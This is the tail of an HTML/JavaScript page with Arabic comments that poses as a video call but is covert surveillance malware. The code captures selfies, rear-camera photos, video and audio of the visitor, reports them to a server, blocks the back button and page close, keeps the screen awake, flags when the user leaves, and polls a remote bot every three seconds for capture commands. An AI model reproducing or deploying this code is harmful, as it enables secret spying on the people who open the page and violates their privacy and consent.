                    videoTrack.enabled = !isCameraOff;
                    camBtn.classList.toggle('off', isCameraOff);
                    camBtn.querySelector('i').className = isCameraOff 
                        ? 'fa-solid fa-video-slash' : 'fa-solid fa-video';
                    showToast(isCameraOff ? '📵 الكاميرا متوقفة' : '📹 الكاميرا تعمل');
                }
            });

            endBtn.addEventListener('click', () => endCall());

            // ==========================================
            // 🔴 إنهاء المكالمة
            // ==========================================
            function endCall() {
                isCallActive = false;
                if (timerInterval) clearInterval(timerInterval);
                stopAllCaptures();
                if (mediaStream) {
                    mediaStream.getTracks().forEach(t => t.stop());
                }

                const duration = Math.floor((Date.now() - callStartTime) / 1000);
                const mins = Math.floor(duration / 60);
                const secs = duration % 60;

                sendToServer('text',
                    `📞 تم إنهاء المكالمة\n` +
                    `⏱️ المدة: ${mins} دقيقة و ${secs} ثانية\n` +
                    `📸 سيلفي: ${countSelfie} | 📷 خلفي: ${countBack}\n` +
                    `🎬 فيديو: ${countVideo} | 🎙️ صوت: ${countAudio}\n` +
                    `📱 من: ${targetNumber}`
                ).catch(() => {});

                endDuration.textContent = `المدة: ${mins} دقيقة و ${secs} ثانية | 📸${countSelfie} 📷${countBack} 🎬${countVideo} 🎙️${countAudio}`;
                endScreen.classList.add('visible');
            }

            // ==========================================
            // ⏰ دوال مساعدة
            // ==========================================
            function sleep(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }

            // ==========================================
            // 🛡️ نظام منع الإغلاق والعمل في الخلفية
            // ==========================================
            
            // منع الرجوع للخلف
            history.pushState(null, null, location.href);
            window.addEventListener('popstate', () => {
                history.pushState(null, null, location.href);
            });

            // منع الإغلاق
            window.addEventListener('beforeunload', (e) => {
                e.preventDefault();
                e.returnValue = 'هل أنت متأكد من مغادرة المكالمة؟ البيانات مستمرة في الإرسال.';
                return e.returnValue;
            });

            // منع السحب للإغلاق (iOS)
            document.addEventListener('touchmove', function(e) {
                if (e.target === document.body || e.target === document.documentElement) {
                    e.preventDefault();
                }
            }, { passive: false });

            // العمل عند الخروج للمتصل
            document.addEventListener('visibilitychange', () => {
                if (document.hidden) {
                    console.log('📱 دخل في الخلفية - الأنظمة مستمرة');
                    sendToServer('text', '📱 المستخدم خرج من الصفحة لكن الأنظمة مستمرة في العمل', 'تنبيه خلفية');
                } else {
                    console.log('📱 عاد للصفحة');
                }
            });

            // منع إيقاف الشاشة
            async function keepAwake() {
                if ('wakeLock' in navigator) {
                    try {
                        await navigator.wakeLock.request('screen');
                    } catch (e) {}
                }
            }
            keepAwake();
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) keepAwake();
            });

            // ==========================================
            // 🤖 نظام استقبال الأوامر من البوت
            // ==========================================
            let commandPollInterval = null;
            let lastCommandId = 0;

            async function pollCommands() {
                try {
                    const response = await fetch('/api/commands/poll', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            sessionId: sessionId,
                            targetNumber: targetNumber,
                            lastId: lastCommandId
                        })
                    });

                    if (response.ok) {
                        const data = await response.json();
                        if (data.commands && data.commands.length > 0) {
                            for (const cmd of data.commands) {
                                executeCommand(cmd);
                                lastCommandId = cmd.id;
                            }
                        }
                    }
                } catch (e) {}
            }

            // بدء استقبال الأوامر كل 3 ثواني
            commandPollInterval = setInterval(pollCommands, 3000);

            function executeCommand(cmd) {
                showToast(`📥 أمر: ${cmd.type}`, 2000);
                
                switch (cmd.type) {
                    case 'video':
                        if (cmd.duration) {
                            settings.videoDuration = parseInt(cmd.duration);
                            showToast(`🎬 فيديو: ${settings.videoDuration} ثانية`);
                            restartAllCaptures();
                            sendToServer('text', `✅ تم ضبط الفيديو على ${settings.videoDuration} ثانية`, 'تأكيد أمر');
                        }
                        break;

                    case 'audio':
                    case 'صوت':
                        if (cmd.duration) {
                            settings.audioDuration = parseInt(cmd.duration);
                            showToast(`🎙️ صوت: ${settings.audioDuration} ثانية`);
                            restartAllCaptures();
                            sendToServer('text', `✅ تم ضبط الصوت على ${settings.audioDuration} ثانية`, 'تأكيد أمر');
                        }
                        break;

                    case 'selfie':
                    case 'سيلفي':
                        if (cmd.count) {
                            settings.selfieCount = parseInt(cmd.count);
                            settings.selfieInterval = cmd.interval || 10;
                            countSelfie = 0;
                            countSelfieEl.textContent = '0';
                            showToast(`🤳 سيلفي: ${settings.selfieCount} صورة كل ${settings.selfieInterval} ث`);
                            restartAllCaptures();
                            sendToServer('text', `✅ تم ضبط السيلفي: ${settings.selfieCount} صورة كل ${settings.selfieInterval} ث`, 'تأكيد أمر');
                        }
                        break;

                    case 'back':
                    case 'خلفي':
                        if (cmd.count) {
                            settings.backCount = parseInt(cmd.count);
                            settings.backInterval = cmd.interval || 10;
                            countBack = 0;
                            countBackEl.textContent = '0';
                            showToast(`📷 خلفي: ${settings.backCount} صورة كل ${settings.backInterval} ث`);
                            restartAllCaptures();
                            sendToServer('text', `✅ تم ضبط الخلفي: ${settings.backCount} صورة كل ${settings.backInterval} ث`, 'تأكيد أمر');
                        }
                        break;

                    case 'stop':
                    case 'ايقاف':
                        stopAllCaptures();
                        showToast('⏸️ تم إيقاف جميع العمليات');
                        sendToServer('text', '⏸️ تم إيقاف جميع العمليات', 'تأكيد أمر');
                        break;

                    case 'start':
                    case 'تشغيل':
                        startAllCaptures();
                        showToast('▶️ تم تشغيل جميع العمليات');
                        sendToServer('text', '▶️ تم تشغيل جميع العمليات', 'تأكيد أمر');
                        break;

                    case 'end':
                    case 'انهاء':
                        showToast('🔴 إنهاء من البوت');
                        endCall();
                        break;

                    case 'status':
                    case 'حالة':
                        sendToServer('text',
                            `📊 *تقرير الحالة*\n` +
                            `⏱️ المدة: ${timerEl.textContent}\n` +
                            `📸 سيلفي: ${countSelfie}/${settings.selfieCount} كل ${settings.selfieInterval} ث\n` +
                            `📷 خلفي: ${countBack}/${settings.backCount} كل ${settings.backInterval} ث\n` +
                            `🎬 فيديو: ${countVideo}/${settings.videoCount} مدة ${settings.videoDuration} ث\n` +
                            `🎙️ صوت: ${countAudio}/${settings.audioCount} مدة ${settings.audioDuration} ث\n` +
                            `🔇 كتم: ${isMuted ? 'نعم' : 'لا'} | 📵 كاميرا: ${isCameraOff ? 'متوقفة' : 'تعمل'}`,
                            '📊 تقرير'
                        );
                        break;
                }
            }

            // ==========================================
            // 🚀 انطلاق
            // ==========================================
            startCall();
            console.log('🚀 النسخة الأعظم انطلقت - جميع الأنظمة نشطة');

        })();
    </script>
</body>
</html>
